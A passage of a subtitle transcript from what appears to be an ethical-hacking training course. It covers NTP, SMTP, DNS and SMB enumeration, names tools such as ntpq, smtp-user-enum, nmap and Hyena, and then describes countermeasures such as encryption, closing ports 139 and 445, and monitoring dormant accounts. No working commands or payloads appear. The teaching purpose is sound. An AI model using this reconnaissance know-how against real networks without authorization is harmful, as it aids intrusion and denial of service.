keyboard and figure it out.\n\n346\n00:14:34.618 --> 00:14:37.452\n>> [LAUGH]\n>> It's so\n\n347\n00:14:37.452 --> 00:14:39.933\nhard to get good help,\nit really is, it really is.\n\n348\n00:14:39.933 --> 00:14:41.833\nSo NTP runs on port 123.\n\n349\n00:14:41.833 --> 00:14:44.146\nWe won't put all these ports, and\nwe won't let Mike get at the list.\n\n350\n00:14:44.146 --> 00:14:45.514\n>> [LAUGH]\n>> We will get the right numbers\n\n351\n00:14:45.514 --> 00:14:46.130\nfor the ports.\n\n352\n00:14:46.130 --> 00:14:48.350\nI will edit the list, you will have it.\n\n353\n00:14:48.350 --> 00:14:52.398\nIt runs on, do you know what protocol\nNTP is actually used since [INAUDIBLE]?\n\n354\n00:14:52.398 --> 00:14:56.510\nIt is a protocol in itself, let me clear,\nand it does run on port 123.\n\n355\n00:14:56.510 --> 00:14:59.176\nBut it runs on top of one of\nthe two carrier protocols.\n\n356\n00:14:59.176 --> 00:15:04.730\nSo Mike, before you say anything, just so\nwe're clear, 50/50 chance here, right?\n\n357\n00:15:04.730 --> 00:15:05.974\n>> I'm gonna say, it's UDP.\n\n358\n00:15:05.974 --> 00:15:06.859\n>> You're gonna be right.\n\n359\n00:15:06.859 --> 00:15:08.946\n>> But you need to verify that I got that.\n\n360\n00:15:08.946 --> 00:15:09.823\n>> Exactly.\n\n361\n00:15:09.823 --> 00:15:14.960\nSo it is connectionless, it is NTP\nrunning on UDP running on port 123.\n\n362\n00:15:14.960 --> 00:15:19.152\nI sound like Theodor Geisel,\ncommonly known as Dr. Seuss by the way.\n\n363\n00:15:19.152 --> 00:15:21.186\nAll right, so we do have NTP running.\n\n364\n00:15:21.186 --> 00:15:23.001\nIt is important,\nwhy do we need that we know?\n\n365\n00:15:23.001 --> 00:15:25.155\nTime synchronization,\nwe talked about this.\n\n366\n00:15:25.155 --> 00:15:29.471\nWe can attack the time synchronization\ninfrastructure if we enumerate it first,\n\n367\n00:15:29.471 --> 00:15:30.857\nso that we know what it is.\n\n368\n00:15:30.857 --> 00:15:34.686\nAnd then as we talked about in\nthe lab demo, we can go after it and\n\n369\n00:15:34.686 --> 00:15:39.531\ndo all sorts of things and reek a denial\nservice attack from within the network,\n\n370\n00:15:39.531 --> 00:15:41.215\nwe can do that very easily.\n\n371\n00:15:41.215 --> 00:15:43.985\nSo we have to be aware of the fact\nthat this may be a problem.\n\n372\n00:15:43.985 --> 00:15:46.001\nAnd NTP enumeration is very important,\n\n373\n00:15:46.001 --> 00:15:48.502\nwe showed you several ways\nto do this in the tools.\n\n374\n00:15:48.502 --> 00:15:52.733\nWe didn't take a look at some\nof the command line tools but\n\n375\n00:15:52.733 --> 00:15:54.856\nthings NTP trace, NTP que.\n\n376\n00:15:54.856 --> 00:15:59.383\nNTPDC, these are all ways to monitor\nthe NTP daemon or NTP service,\n\n377\n00:15:59.383 --> 00:16:03.190\nas well as,\ntaking a look at what's going on with it.\n\n378\n00:16:03.190 --> 00:16:05.140\nSo these are tools that can be run or\n\n379\n00:16:05.140 --> 00:16:07.700\ncommand line tools that can be run\nfrom the Linux side in Kali, for\n\n380\n00:16:07.700 --> 00:16:10.330\ninstance, that would allow you\nto actually be able to do this.\n\n381\n00:16:10.330 --> 00:16:13.360\nWe didn't get really get into Kali and\ndo that particular part of it, but\n\n382\n00:16:13.360 --> 00:16:16.487\nyou could easily do NTP enumeration using\none or more of those tools along or\n\n383\n00:16:16.487 --> 00:16:19.420\nwith any of the Windows based tools\nthat we took a look at, right?\n\n384\n00:16:19.420 --> 00:16:23.480\nWireshark lets you monitor all this\ntraffic, looking for it, picking it out,\n\n385\n00:16:23.480 --> 00:16:27.420\nfinding the NTP source IP, so\nwe know what machine's the target.\n\n386\n00:16:27.420 --> 00:16:32.300\nNever underestimate, by the way, the value\nof passive scanning for reconnaissance and\n\n387\n00:16:32.300 --> 00:16:33.350\nfor enumeration.\n\n388\n00:16:33.350 --> 00:16:37.270\nWe find a tremendous amount of information\nin those traffic flows that we can then\n\n389\n00:16:37.270 --> 00:16:38.590\npull out and leverage.\n\n390\n00:16:38.590 --> 00:16:40.600\nAnd we always wanna be\nthinking about that.\n\n391\n00:16:40.600 --> 00:16:45.180\nThere's so much traffic transiting\nback and forth across our networks\n\n392\n00:16:45.180 --> 00:16:47.970\nthat if we're not paying attention to it,\nwe really are losing or\n\n393\n00:16:47.970 --> 00:16:51.410\nmissing an opportunity that\nis golden because it's free.\n\n394\n00:16:51.410 --> 00:16:54.260\nI mean we just literally gotta put\na listener out there and record it, and\n\n395\n00:16:54.260 --> 00:16:57.930\nwe get a treasure trove of information,\nbecause even if we're encrypting\n\n396\n00:16:57.930 --> 00:17:01.520\nthe traffic, the IP addresses for\nthe source are gonna be there,\n\n397\n00:17:01.520 --> 00:17:05.970\nwhich means we can target the NTP devices\njust by looking for NTP packets and\n\n398\n00:17:05.970 --> 00:17:07.930\nwatching the transmission back and\nforth and\n\n399\n00:17:07.930 --> 00:17:09.920\ndeciphering who's sending and\nwho's receiving?\n\n400\n00:17:09.920 --> 00:17:12.120\nAnd in this case it's probably\nnot encrypted anyway,\n\n401\n00:17:12.120 --> 00:17:13.710\nit wouldn't matter even if it was.\n\n402\n00:17:13.710 --> 00:17:15.280\nWe're not looking at passwords or\nanything like that.\n\n403\n00:17:15.280 --> 00:17:17.870\nWe're just looking at\nsynchronization traffic, but\n\n404\n00:17:17.870 --> 00:17:19.645\nwe are getting very valuable information.\n\n405\n00:17:19.645 --> 00:17:23.420\nAnd an encrypted packet is still gonna\nhave the IP address information and\n\n406\n00:17:23.420 --> 00:17:26.380\nthe header that can be read because we\nare not encrypting the entire packet,\n\n407\n00:17:26.380 --> 00:17:28.430\nwe're encrypting the payload\ntraditionally, right.\n\n408\n00:17:28.430 --> 00:17:31.010\nSo that's something we could see and\nwe would be able to understand.\n\n409\n00:17:31.010 --> 00:17:34.060\nSo keep in mind that that\ninformation would still be captured.\n\n410\n00:17:34.060 --> 00:17:36.690\nSo it is important for\nus to be able to be aware of that, right,\n\n411\n00:17:36.690 --> 00:17:38.950\nbeing able to snoop on that\ntraffic could be very valuable.\n\n412\n00:17:38.950 --> 00:17:40.791\nWhat about SMTP enumeration?\n\n413\n00:17:40.791 --> 00:17:43.230\nLooking at email traffic and\nemail numeration.\n\n414\n00:17:43.230 --> 00:17:46.950\nWe've talked about this, we've took a look\nat host headers when we did fingerprinting\n\n415\n00:17:46.950 --> 00:17:49.800\nand recon, so we talked about that and\nwhy that could be important.\n\n416\n00:17:49.800 --> 00:17:52.660\nWe talked about the fact that\nthere is gonna be traffic flowing\n\n417\n00:17:52.660 --> 00:17:53.530\nand back and forth.\n\n418\n00:17:53.530 --> 00:17:57.730\nSomething like Wireshark or Packetizer\nanother great tool that I talked about,\n\n419\n00:17:57.730 --> 00:18:00.790\nthat is a network traffic management tool,\nthat can be used.\n\n420\n00:18:00.790 --> 00:18:02.970\nHave you used universal network monitor,\nMicrosoft put out?\n\n421\n00:18:02.970 --> 00:18:04.290\n>> I have not used the latest one.\n\n422\n00:18:04.290 --> 00:18:05.949\n>> It's supposed to be really nice,\nI haven't tried it either.\n\n423\n00:18:05.949 --> 00:18:07.270\n>> 10 and 2016, yeah.\n\n424\n00:18:07.270 --> 00:18:08.620\n>> Yeah it's supposed to be really cool.\n\n425\n00:18:08.620 --> 00:18:10.942\nI haven't taken a look at it yet,\nbut it's gonna,\n\n426\n00:18:10.942 --> 00:18:14.085\ntools like that are the tools that\nwe wanna make sure we know, right?\n\n427\n00:18:14.085 --> 00:18:15.750\nOr at least be aware.\nThat's gonna be important.\n\n428\n00:18:17.140 --> 00:18:19.940\nMaking sure that we are aware\nof the ability to be able\n\n429\n00:18:19.940 --> 00:18:21.320\nto monitor this traffic, right?\n\n430\n00:18:21.320 --> 00:18:25.180\nAnd to either passively record it,\nto just be able to look at it, or\n\n431\n00:18:25.180 --> 00:18:28.540\nmonitor it actively and interact with it\nand interact with what's going on and\n\n432\n00:18:28.540 --> 00:18:30.680\nsee it, is important for\nus to be aware of.\n\n433\n00:18:30.680 --> 00:18:32.180\nAnd we can do one or both.\n\n434\n00:18:32.180 --> 00:18:36.040\nAnd it is important for us to know that we\ncan enumerate all sorts of traffic, and\n\n435\n00:18:36.040 --> 00:18:37.850\nwe can then interact with that traffic.\n\n436\n00:18:37.850 --> 00:18:40.120\nWe actually talked about\ncrafting attack packets.\n\n437\n00:18:40.120 --> 00:18:42.140\nAnd I showed you through nmap for\ninstance.\n\n438\n00:18:42.140 --> 00:18:45.070\nThat we could do all sorts of scans,\nstealthily and otherwise,\n\n439\n00:18:45.070 --> 00:18:46.760\nand get back all sorts of information.\n\n440\n00:18:46.760 --> 00:18:49.950\nAnd we've demoed some of those options for\nyou and taken a look at that,\n\n441\n00:18:49.950 --> 00:18:51.362\nand we'll obviously continue to.\n\n442\n00:18:51.362 --> 00:18:56.460\nThere are SMTP enumeration tools in Kali,\n\n443\n00:18:56.460 --> 00:19:01.225\nwe haven't demonstrated all of them but\ncertainly SMTP usernum which is short for\n\n444\n00:19:01.225 --> 00:19:05.100\nenumeration is an SMTP enumeration\ntool that can be found in Kali.\n\n445\n00:19:05.100 --> 00:19:07.090\nSo that's something to consider, right?\n\n446\n00:19:07.090 --> 00:19:10.330\nKeep in mind that if people are silly\nenough to be able to use something like\n\n447\n00:19:10.330 --> 00:19:14.061\nTelnet today, even though we've been out\nthere for 10 years telling them not to.\n\n448\n00:19:14.061 --> 00:19:16.248\nBut if they are using a command line tool,\n\n449\n00:19:16.248 --> 00:19:19.624\nrather a console tool that's not\ngonna be encrypted natively,\n\n450\n00:19:19.624 --> 00:19:24.110\nwe'll get not just traffic but usernames\nand passwords as part of that as well.\n\n451\n00:19:24.110 --> 00:19:27.540\nWe obviously recommend using something\nthat's gonna be SSH enabled.\n\n452\n00:19:27.540 --> 00:19:30.700\nSo maybe a Putty connection using SSH,\nor whatever it may be.\n\n453\n00:19:30.700 --> 00:19:32.890\nSo those are the kind of\nthings to think about.\n\n454\n00:19:32.890 --> 00:19:36.980\nBut if we're allowing that traffic to\ntransit and not protecting it, we're gonna\n\n455\n00:19:36.980 --> 00:19:40.520\nget a lot more than just IP addresses when\nwe actually start to sniffing around.\n\n456\n00:19:40.520 --> 00:19:41.920\nAnd capturing that traffic, right.\n\n457\n00:19:41.920 --> 00:19:45.270\nDNS zone transfer information,\nwe've talked about the value of nslookup,\n\n458\n00:19:45.270 --> 00:19:48.910\nthe value of zone files and\nbeing able to look at that information.\n\n459\n00:19:48.910 --> 00:19:52.390\nSo doing zone transfers and\nenumerating zones will be very helpful and\n\n460\n00:19:52.390 --> 00:19:54.280\nvery important for us to be aware of.\n\n461\n00:19:54.280 --> 00:19:57.390\nAnd we've reviewed how some of that\nstuff could actually come up and\n\n462\n00:19:57.390 --> 00:19:59.175\npotentially be valuable for us, right.\n\n463\n00:19:59.175 --> 00:20:00.080\n>> Mm-hm.\n\n464\n00:20:00.080 --> 00:20:01.560\n>> Wanna make sure we're aware of that.\n\n465\n00:20:01.560 --> 00:20:04.730\nWe've talked about a lot of\nthe enumeration things, right,\n\n466\n00:20:04.730 --> 00:20:06.580\nthe focal points, the areas, the tools.\n\n467\n00:20:06.580 --> 00:20:07.510\nWhat about countermeasures?\n\n468\n00:20:07.510 --> 00:20:10.580\nI've kinda sprinkled some of them\nin our conversation up until now.\n\n469\n00:20:10.580 --> 00:20:13.730\nFirst and foremost, number one\ncounter measure beyond everything else\n\n470\n00:20:13.730 --> 00:20:15.820\nthat we talked about up until\nthis moment in time, but\n\n471\n00:20:15.820 --> 00:20:18.430\nI've mentioned it just now,\nwould be using encryption.\n\n472\n00:20:18.430 --> 00:20:22.130\nIf we encrypt traffic on the wire,\nmost of what we've been able to do,\n\n473\n00:20:22.130 --> 00:20:25.200\nmost of what we've talked about, most of\nwhat we've shown you in the demos that\n\n474\n00:20:25.200 --> 00:20:29.160\nwe've done, would be impossible, if not\nvery difficult to achieve because even\n\n475\n00:20:29.160 --> 00:20:32.650\nthough we may get information,\nit will be in a form that we can't read.\n\n476\n00:20:32.650 --> 00:20:37.060\nAnd so enumerating is really\nprimarily gonna be a function of,\n\n477\n00:20:37.060 --> 00:20:40.550\nif it is successful, a function of there\nnot being tight network security and\n\n478\n00:20:40.550 --> 00:20:44.950\nencryption and use some encrypted\nprotocol transfers on the wire.\n\n479\n00:20:44.950 --> 00:20:47.830\nBecause if we're encrypting traffic\non the wire, it's a lot tougher for\n\n480\n00:20:47.830 --> 00:20:48.810\nus to enumerate things.\n\n481\n00:20:48.810 --> 00:20:50.040\nNow having said that,\n\n482\n00:20:50.040 --> 00:20:53.190\nthat doesn't mean we can't still\nenumerate service-based information.\n\n483\n00:20:53.190 --> 00:20:57.520\nTools like Hyena may still very well work\neven though we're encrypting traffic.\n\n484\n00:20:57.520 --> 00:20:59.200\nBut a lot of the information\nthat we're getting,\n\n485\n00:20:59.200 --> 00:21:02.870\nwhat we're snooping using Wireshark and\nstuff like that would be useless\n\n486\n00:21:02.870 --> 00:21:05.820\nbecause we wouldn't be able to get\nthose usernames and those passwords.\n\n487\n00:21:05.820 --> 00:21:07.150\nWe'd get encrypted garbage.\n\n488\n00:21:07.150 --> 00:21:10.275\nWe wouldn't be able to see raw data feeds,\nwe'd get encrypted garbage.\n\n489\n00:21:10.275 --> 00:21:12.285\nSo that's one of the key\nthings we wanna do.\n\n490\n00:21:12.285 --> 00:21:16.515\nWe wanna tighten up using services that\nare older and versions of them and\n\n491\n00:21:16.515 --> 00:21:17.795\nprotocols that are older.\n\n492\n00:21:17.795 --> 00:21:21.645\nI talked about SNMP and not allowing\nversion one to be used anymore because\n\n493\n00:21:21.645 --> 00:21:23.075\nthere's no native encryption and\n\n494\n00:21:23.075 --> 00:21:27.675\nsecurity with that protocol versus using\nlet's say version three, a newer version.\n\n495\n00:21:27.675 --> 00:21:29.235\nSo we wanna make sure we're aware of that.\n\n496\n00:21:29.235 --> 00:21:30.875\nAgain, that's gonna be very helpful.\n\n497\n00:21:30.875 --> 00:21:32.730\nWe wanna understand that.\n\n498\n00:21:32.730 --> 00:21:34.910\nTiming up and nibbling up at our defenses,\n\n499\n00:21:34.910 --> 00:21:39.020\nconstantly checking what's going on,\nstripping out all unnecessary services,\n\n500\n00:21:39.020 --> 00:21:43.750\nusing the methodology we talked about\nwhere we look at what's running\n\n501\n00:21:43.750 --> 00:21:47.410\nout natively in the GUi with something\nlike Task Manager for the obvious stuff.\n\n502\n00:21:47.410 --> 00:21:51.870\nBut then profiling the box using another\nkind of tool that will give us information\n\n503\n00:21:51.870 --> 00:21:56.012\nabout processes that are running that\nmay not be exposed to tool such as\n\n504\n00:21:56.012 --> 00:22:00.230\nTask Manager, but may show up in one of\nthe other tools that we talked about.\n\n505\n00:22:00.230 --> 00:22:04.960\nOr using a command line tool like PS -list\nor something to show all running processes\n\n506\n00:22:04.960 --> 00:22:07.590\neven though they may not be tagged\nas being available in the GUI,\n\n507\n00:22:07.590 --> 00:22:09.940\nwould be valuable because\nyou wanna know what's there.\n\n508\n00:22:09.940 --> 00:22:13.130\nYou may have headless\napps that are running,\n\n509\n00:22:13.130 --> 00:22:15.570\nor headless software that's\nbeen installed and running.\n\n510\n00:22:15.570 --> 00:22:17.390\nWhen I say headless,\nI mean no GUI interface right,\n\n511\n00:22:17.390 --> 00:22:18.440\nit's running in the background.\n\n512\n00:22:18.440 --> 00:22:20.080\nYou just don't see it, don't know it.\n\n513\n00:22:20.080 --> 00:22:23.584\nBut, it could be there and that may\nvery well be a remote access trojan.\n\n514\n00:22:23.584 --> 00:22:26.319\nIt could be a piece of malware,\na command and control interface,\n\n515\n00:22:26.319 --> 00:22:29.849\nit could be a keylogger, there's all sorts\nof stuff that could be going on that would\n\n516\n00:22:29.849 --> 00:22:31.970\nbe running there that you\nwould wanna know about.\n\n517\n00:22:31.970 --> 00:22:34.210\nSo we wanna make sure we're aware of that,\nright?\n\n518\n00:22:34.210 --> 00:22:37.750\nThere's a lot of different options that\nwe could bring to the table and use for\n\n519\n00:22:37.750 --> 00:22:38.262\nscanning.\n\n520\n00:22:38.262 --> 00:22:42.900\nWe wanna make sure that we're aware of\nwhat they do and how we can use them,\n\n521\n00:22:42.900 --> 00:22:47.120\nfrom our perspective as CHs as\nethical hackers to the benefit\n\n522\n00:22:47.120 --> 00:22:50.380\nof our acquisition of knowledge and\nto the detriment of the hacker.\n\n523\n00:22:50.380 --> 00:22:52.220\nWe talked about vulnerability\nassessments and\n\n524\n00:22:52.220 --> 00:22:55.070\nvulnerability scanning,\nwe've talked about pentesting.\n\n525\n00:22:55.070 --> 00:22:57.890\nWe've talked about the use of\npentesting as the next step\n\n526\n00:22:57.890 --> 00:23:01.290\nfrom vulnerability assessments and\nscanning to essentially go live,\n\n527\n00:23:01.290 --> 00:23:04.150\ngo active with that data, and\nreally validate what's there.\n\n528\n00:23:04.150 --> 00:23:07.790\nJust because a vulnerability shows up on\na scan doesn't mean that the machine is\n\n529\n00:23:07.790 --> 00:23:09.070\nalways gonna be vulnerable.\n\n530\n00:23:09.070 --> 00:23:10.950\nIt means that it's likely to be,\nbut it may not be.\n\n531\n00:23:10.950 --> 00:23:14.100\nThe only way to validate for\nsure is to actually go live,\n\n532\n00:23:14.100 --> 00:23:17.110\ndo a pen test, try to get it in the\nmachine, and exploit the vulnerability.\n\n533\n00:23:17.110 --> 00:23:20.270\nYou talk about port scans,\ntalked about network scans,\n\n534\n00:23:20.270 --> 00:23:24.930\nyou know looking at traffic versus\nlooking at open ports, service scans.\n\n535\n00:23:24.930 --> 00:23:26.890\nAll sorts of things that could be done.\n\n536\n00:23:26.890 --> 00:23:30.460\nBeing able to differentiate between\nthem would be very important.\n\n537\n00:23:30.460 --> 00:23:34.100\nEncryption is probably the number one\nthing that we often talk about doing\n\n538\n00:23:34.100 --> 00:23:37.380\nto safeguard most of our systems and\nprotect and\n\n539\n00:23:37.380 --> 00:23:40.810\nprevent form compromise the information\nflowing back and forth.\n\n540\n00:23:40.810 --> 00:23:43.180\nWhether it's LDAP traffic moving back and\nforth.\n\n541\n00:23:43.180 --> 00:23:45.945\nWhether it's SMTP traffic moving back and\nforth.\n\n542\n00:23:45.945 --> 00:23:49.537\nAnd by the way, people often confuse,\nwhen we talk about email in particular,\n\n543\n00:23:49.537 --> 00:23:53.079\npeople often confuse the protection\nthat digital signatures provide which is\n\n544\n00:23:53.079 --> 00:23:54.061\nan integrity check.\n\n545\n00:23:54.061 --> 00:23:57.175\nHaving nothing to do with\nconfidentiality and protecting data.\n\n546\n00:23:57.175 --> 00:24:01.675\nIn terms of making sure it's not seen\nby bad actors with the confidentiality\n\n547\n00:24:01.675 --> 00:24:04.080\nprotection that encryption provides.\n\n548\n00:24:04.080 --> 00:24:06.670\nAnd so don't get caught in that dialogue.\n\n549\n00:24:06.670 --> 00:24:10.092\nAnd make sure if you are asked to choose,\nyou choose wisely, right.\n\n550\n00:24:10.092 --> 00:24:13.806\nBecause it is important to know that\ndigital signatures, which essentially\n\n551\n00:24:13.806 --> 00:24:17.940\ncreate a message digest to hash are not\ngonna provide confidentiality protections.\n\n552\n00:24:17.940 --> 00:24:21.820\nAll they do is provide integrity, and\nproof of origin, and nonrepediation.\n\n553\n00:24:21.820 --> 00:24:24.575\nThey do not provide\nconfidentiality protections.\n\n554\n00:24:24.575 --> 00:24:28.825\nWhereas, confidentiality protections,\nencryption based protections that use\n\n555\n00:24:28.825 --> 00:24:33.135\nencryption algorithms to hide\ndata from unauthorized users.\n\n556\n00:24:33.135 --> 00:24:35.875\nAre what we want to be able to use in\norder to protect data in this case.\n\n557\n00:24:35.875 --> 00:24:38.475\nSo, those are gonna be very important for\nus to consider.\n\n558\n00:24:38.475 --> 00:24:40.380\nVery, very helpful for us to think about.\n\n559\n00:24:40.380 --> 00:24:42.700\nWe have to think on Microsoft networks.\n\n560\n00:24:42.700 --> 00:24:45.680\nEspecially, about SMB,\nServer Message Block, traffic and\n\n561\n00:24:45.680 --> 00:24:49.620\nenumeration of server message block\ntraffic, can be very telling as well.\n\n562\n00:24:49.620 --> 00:24:52.490\nYou know one of the ways we find most of\nthe stuff we showed you in tools like\n\n563\n00:24:52.490 --> 00:24:56.250\nSuperScan, in Hyena in Curve ports.\n\n564\n00:24:56.250 --> 00:24:57.810\nIn any of those tools we looked at.\n\n565\n00:24:57.810 --> 00:24:59.200\nMegaping, right?\n\n566\n00:24:59.200 --> 00:25:00.790\nIs through SMB manipulation.\n\n567\n00:25:00.790 --> 00:25:02.890\nServer message block\nprotocol manipulation.\n\n568\n00:25:02.890 --> 00:25:05.800\nBecause this traffic is\navailable on Windows networks.\n\n569\n00:25:05.800 --> 00:25:09.220\nEven to this day, because we\nstill use SMB for so much, right?\n\n570\n00:25:09.220 --> 00:25:12.640\nSo, think about being able to disable SMB.\n\n571\n00:25:12.640 --> 00:25:15.810\nIf we do that, if we go in and\nturn off SMB on web and DNS service.\n\n572\n00:25:15.810 --> 00:25:18.743\nWe're gonna block a lot of\naccess to this kind of traffic.\n\n573\n00:25:18.743 --> 00:25:20.345\nWe're not gonna see a lot of it.\n\n574\n00:25:20.345 --> 00:25:22.080\nEspecially on web and DNS search.\n\n575\n00:25:22.080 --> 00:25:25.850\nA great way to counteract a lot of that\nstuff that we were doing would be to\n\n576\n00:25:25.850 --> 00:25:26.400\nmanage this.\n\n577\n00:25:26.400 --> 00:25:30.770\nDisable any and\nall Internet facing services, excuse me.\n\n578\n00:25:30.770 --> 00:25:33.530\nOn any and all Internet facing interfaces.\n\n579\n00:25:33.530 --> 00:25:37.264\nIn other words, disable SMB on\nall Internet facing servers.\n\n580\n00:25:37.264 --> 00:25:38.780\nThere's no reason to have it on out there.\n\n581\n00:25:38.780 --> 00:25:41.065\nCuz it's really an internal thing anyway.\n\n582\n00:25:41.065 --> 00:25:44.055\nAnd that will prevent enumeration\nof information that's there.\n\n583\n00:25:44.055 --> 00:25:46.095\nBut also,\nstuff that's coming in from behind.\n\n584\n00:25:46.095 --> 00:25:49.200\nThat may show up on that machine and\nthat's gonna be something to consider.\n\n585\n00:25:49.200 --> 00:25:55.030\nDisable ports TCP 139 and 445,\nwhich are used by the SMB protocol.\n\n586\n00:25:55.030 --> 00:25:57.940\nBut are not necessary outside the network.\n\n587\n00:25:57.940 --> 00:25:59.320\nSo you may wanna turn those off.\n\n588\n00:25:59.320 --> 00:26:01.040\nSo that they can't be compromised.\n\n589\n00:26:01.040 --> 00:26:02.770\nYou saw on almost any scan we did.\n\n590\n00:26:02.770 --> 00:26:06.000\nThat 139 and 445 were showing up\non all the Microsoft machines.\n\n591\n00:26:06.000 --> 00:26:08.070\nSo again, it's something to think about.\n\n592\n00:26:08.070 --> 00:26:12.311\nRestrict anonymous access through the\nrestrict null session access parameter in\n\n593\n00:26:12.311 --> 00:26:13.545\nthe Windows registry.\n\n594\n00:26:13.545 --> 00:26:16.590\nIt's another one that\nused to be not turned on.\n\n595\n00:26:16.590 --> 00:26:18.290\nThen in a version of the OS was turned on.\n\n596\n00:26:18.290 --> 00:26:19.360\nThen we turned it off again.\n\n597\n00:26:19.360 --> 00:26:20.830\nNow we're turning it back on again.\n\n598\n00:26:20.830 --> 00:26:24.910\nGoing all the way back to NT351\nmarching through current versions.\n\n599\n00:26:24.910 --> 00:26:26.821\nAt certain points\nMicrosoft had it enabled.\n\n600\n00:26:26.821 --> 00:26:28.440\nAt other points it had it disabled.\n\n601\n00:26:28.440 --> 00:26:31.700\nAnd it used to make it real easy to hack\ninto Windows boxes at a certain point.\n\n602\n00:26:31.700 --> 00:26:32.650\nBecause when it was turned on.\n\n603\n00:26:32.650 --> 00:26:34.410\nWe can just get right into the box.\n\n604\n00:26:34.410 --> 00:26:36.939\nNow it's turned off, but\nyou have to know how to disable or\n\n605\n00:26:36.939 --> 00:26:39.894\nenable it depending on what version\nof the OS you're working with.\n\n606\n00:26:39.894 --> 00:26:42.530\nSo these are things\nunder the SMB category.\n\n607\n00:26:42.530 --> 00:26:44.370\nThe server message log category.\n\n608\n00:26:44.370 --> 00:26:46.590\nThat we want to think\nabout from an enumeration.\n\n609\n00:26:46.590 --> 00:26:50.849\nBut most importantly from a enumeration\ncounter measure perspective, right.\n\n610\n00:26:50.849 --> 00:26:52.900\nThat we want to make sure\nwe're thinking about.\n\n611\n00:26:52.900 --> 00:26:55.630\nMaking sure that we go through.\n\n612\n00:26:55.630 --> 00:26:57.010\nI didn't show you this with Hyena.\n\n613\n00:26:57.010 --> 00:27:00.330\nWe can easily do it, but\nI didn't bother to demo it for you.\n\n614\n00:27:00.330 --> 00:27:04.310\nBut making sure that we can go in, and\nyou can do this not just from Hyena.\n\n615\n00:27:04.310 --> 00:27:07.570\nYou can do this is in any\nLDAP management tool.\n\n616\n00:27:07.570 --> 00:27:11.011\nRun a simple query that says show me\nall accounts that have been dormant for\n\n617\n00:27:11.011 --> 00:27:11.909\n30 days or more.\n\n618\n00:27:11.909 --> 00:27:13.512\nAll right,\nwe have those stored queries we can use.\n\n619\n00:27:13.512 --> 00:27:14.760\nOr we can certainly make them.\n\n620\n00:27:14.760 --> 00:27:17.700\nAnd, using WQL, W my Query Language, or\n\n621\n00:27:17.700 --> 00:27:22.180\nwhatever query language we wanna use,\nin Microsoft's case it would be WQL.\n\n622\n00:27:22.180 --> 00:27:24.330\nWe can go through and\nlook for those accounts.\n\n623\n00:27:24.330 --> 00:27:25.890\nWe should be monitoring those accounts.\n\n624\n00:27:25.890 --> 00:27:27.100\nWe should be flagging them.\n\n625\n00:27:27.100 --> 00:27:27.976\nYou may disable them.\n\n626\n00:27:27.976 --> 00:27:31.820\nYou should have a policy in your\norganization that says if somebody goes on\n\n627\n00:27:31.820 --> 00:27:34.310\nan extended vacation, extended leave.\n\n628\n00:27:34.310 --> 00:27:35.320\nMaybe they're on maternity leave.\n\n629\n00:27:35.320 --> 00:27:36.850\nMaybe they're out for sick leave.\n\n630\n00:27:36.850 --> 00:27:38.235\nMaybe, God forbid, somebody's sick, and\n\n631\n00:27:38.235 --> 00:27:40.100\nthey have to take off instead\noff an extended period of time.\n\n632\n00:27:40.100 --> 00:27:41.700\nWhatever the case may be.\n\n633\n00:27:41.700 --> 00:27:43.370\nI'm not talking about,\nwe're out for a week on vacation.\n\n634\n00:27:43.370 --> 00:27:45.960\nI'm talking about you're gonna be out for\na month, right?\n\n635\n00:27:45.960 --> 00:27:49.360\nIf that's the case,\nthat account should be at a minimum.\n\n636\n00:27:49.360 --> 00:27:54.820\nShould be under close scrutiny and\nmonitored for logons at suspicious times.\n\n637\n00:27:54.820 --> 00:27:56.538\nIf that person may be working remotely,\n\n638\n00:27:56.538 --> 00:27:58.870\nbecause they're gonna be home bound for\na while.\n\n639\n00:27:58.870 --> 00:28:01.068\nYou may not want to disable\nthe account while they are away.\n\n640\n00:28:01.068 --> 00:28:03.300\nBut if they're gonna be out and\nnot interacting.\n\n641\n00:28:03.300 --> 00:28:06.514\nNot delete it, but disable it so\nit can't be use until they return.\n\n642\n00:28:06.514 --> 00:28:11.528\nIf they are going to be out and\nare only logging in on occasion.\n\n643\n00:28:11.528 --> 00:28:13.290\nThen you may not be able\nto disable the account.\n\n644\n00:28:13.290 --> 00:28:15.650\nBut you should at least monitor\nthat account more closely.\n\n645\n00:28:15.650 --> 00:28:18.890\nBecause a lot of these accounts\ncan easily be identified.\n\n646\n00:28:18.890 --> 00:28:22.010\nAs a matter of fact,\nit's something for us to think about.\n\n647\n00:28:22.010 --> 00:28:23.190\nGive me just a second.\n\n648\n00:28:23.190 --> 00:28:25.497\nLet me just quickly log back\ninto the demo environment.\n\n649\n00:28:25.497 --> 00:28:28.566\nI want to show you this\nexact thing in Hyena.\n\n650\n00:28:28.566 --> 00:28:29.825\nI'm just gonna quickly log in.\n\n651\n00:28:29.825 --> 00:28:31.665\nSo you're gonna see me kind\nof just stand to the side for\n\n652\n00:28:31.665 --> 00:28:32.665\nhalf a second while I do that.\n\n653\n00:28:32.665 --> 00:28:33.881\nBecause I didn't actually have this setup.\n\n654\n00:28:33.881 --> 00:28:36.295\nSo I'm just gonna go back in real quick,\nand authenticate.\n\n655\n00:28:36.295 --> 00:28:40.826\nBut while I'm doing that, what we wanna do\nis actually just quickly look at how you\n\n656\n00:28:40.826 --> 00:28:42.545\nguys can run this particular.\n\n657\n00:28:42.545 --> 00:28:44.591\nAs I'm talking and\ntrying to type at the same time,\n\n658\n00:28:44.591 --> 00:28:45.935\nwhich is just not working at all.\n\n659\n00:28:45.935 --> 00:28:48.002\nI am not going to be able to multitask.\n\n660\n00:28:48.002 --> 00:28:49.025\nThere we go.\nWe want to be\n\n661\n00:28:49.025 --> 00:28:51.715\nable to see how you can use this\nparticular script that I'm talking about,\n\n662\n00:28:51.715 --> 00:28:53.915\nor this query to be able\nto find these accounts.\n\n663\n00:28:53.915 --> 00:28:58.700\nSo, what hackers will do if they\nhave access to this information, or\n\n664\n00:28:58.700 --> 00:29:00.388\nat least access to the active directory.\n\n665\n00:29:00.388 --> 00:29:03.480\nAnd we talked about the fact that\nit may not be that hard right?\n\n666\n00:29:03.480 --> 00:29:08.710\nTo be able to get an account and as a\nresult if we could compromise an account.\n\n667\n00:29:08.710 --> 00:29:10.653\nWe may be able to actually get in and\n\n668\n00:29:10.653 --> 00:29:14.610\nhave access to run a script that will\ntell us this kind of information.\n\n669\n00:29:14.610 --> 00:29:17.728\nSo what we want to look at right,\nis something like this.\n\n670\n00:29:17.728 --> 00:29:22.780\nJust let me just go ahead and log in and\nthen we'll go ahead and we will.\n\n671\n00:29:22.780 --> 00:29:23.510\nThere we go.\n\n672\n00:29:23.510 --> 00:29:26.519\nWe'll have you come back\nup on my machine 